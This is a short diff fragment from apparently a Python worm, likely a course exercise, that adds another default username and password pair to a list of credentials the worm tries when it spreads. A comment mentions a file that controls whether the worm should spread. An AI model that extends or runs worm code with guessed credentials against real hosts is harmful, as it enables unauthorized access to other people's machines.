@@ -14,7 +14,8 @@ credList = [
 ('hello1', 'world'),
 ('root', '#Gig#'),
 ('cpsc', 'cpsc'),
-('ubuntu', '123456')
+('ubuntu', '123456'),
+('cs2019', 'cs2019')
 ]
 
 # The file marking whether the worm should spread
